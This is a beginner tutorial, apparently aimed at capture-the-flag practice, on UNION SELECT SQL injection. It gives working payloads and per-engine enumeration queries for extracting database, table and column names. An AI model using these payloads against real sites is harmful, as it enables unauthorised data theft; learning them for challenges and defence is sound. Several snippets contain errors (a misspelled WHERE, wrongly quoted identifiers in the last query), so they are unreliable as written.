# Beginner's SQL Injection Guide
# UNION SELECT Injection
For most beginner SQL injection challenges, we are either dealing with SQL injection login bypass or in-band union select SQL injection. This guide will walk throught he process of working through in-band union select SQL injection attacks, where the goal is to obtain data from tables in the SQL database.
## 1 Identify Injection Point
The first step is to identify the injection point for SQL injection. For beginner challenges, the injection points are usually in a user submission field on a webpage or a URL parameter in the address bar. A common way to test if an injection point is valid is to send input in the form of a single quote ( ' ) or double quote ( " ). If the system returns an error message, that is a good indicator of a SQL injection point.
## 2 Determine Number of Columns for UNION SELECT
The second step is to determine how many columns the original SQL statement returned in a UNION SELECT statement. Observing the information returned by the web app can give us a good indicator of how many columns we should include. When testing for the number of columns, we should use null values to count the number of columns. For example:
```
' UNION SELECT null,null,null -- 
```
The above would test the system for 3 columns in the original statement.
## 3 Identify the DBMS used by the Web App
The third step is to determine the DBMS (the 'flavor' of SQL being used) by the web app. E.g., MySQL, MSSSQL, SQLite, etc. Some challenges will tell you the type of SQL system being used, but if there are no indications, we can use a few different functions to figure out what DBMS is being used. 
```
version()
```
This will ID MySQL, MariaDB or PostgreSQL
```
@@version
```
This will ID MSSQL or MySQL
```
sysdate FROM dual
```
This will ID Oracle
```
sqlite_version()
```
This will ID SQLite
## 4 Determine the Database names in the System (OPTIONAL)
Although we often cannot access databases aside from the one that the web app uses, it's useful for enumeration purposes, and we sometimes need to know the name of the current database to enumerate its tables.
```
SELECT schema_name FROM information_schema.schemata
```
This works for both MySQL and MariaDB
```
SELECT datname FROM pg_database
```
This works for PostgresSQL
```
SELECT name from sys.databases
```
This works for SQL Server
```
SELECT username FROM all_users
```
This works for Oracle
```
# SQLite does not have multiple databases
```
This works for SQLite
## 5 Determine the name of the Current Database
We sometimes need to know the name of the current database to obtain table names.
```
SELECT database()
```
This works for MySQL and MariaDB
```
SELECT current_database()
```
This works for PostgreSQL
```
SELECT db_name()
```
This works for SQL Server
```
SELECT ora_database_name FROM dual
```
This works for Oracle
```
PRAGMA database_list
```
This works for SQLite
## 6 Determine the Table names in the Database
In order to figure out which tables have the juicy data we're looking for, we need to know the names of all the tables in the database
```
SELECT table_name FROM information_schema.tables WHERE table_schema = database()
```
This works for MySQL and MariaDB
```
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'
```
This works for PostgreSQL
```
SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE'
```
This works for SQL Server
```
SELECT table_name FROM all_tables
```
This works for Oracle
```
SELECT name FROM sqlite_master HWERE type = 'table'
```
This works for SQLite

## 7 Determine the Column names in the Tables
Once we've identified tables that we want to look at, we need to figure out which column names exist in those tables.
```
SELECT column_name FROM information_schema.columns WHERE table_name = 'your_table_name' AND table_schema = DATABASE()
```
This works for MySQL and MariaDB
```
SELECT column_name FROM information_schema.columns WHERE table_name = 'your_table_name' AND table_schema = 'public'
```
This works for PosgreSQL
```
SELECT column_name FROM information_schema.columns WHERE table_name = 'your_table_name'; or SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('your_table_name')
```
This works for SQL Server
```
SELECT column_name FROM all_tab_columns WHERE table_name = 'YOUR_TABLE_NAME'
```
This works Oracle
```
PRAGMA table_info('your_table_name')
```
This works for SQLite

## 8 Output Column Contents from Tables
```
SELECT 'column_name' FROM 'table_name'
```
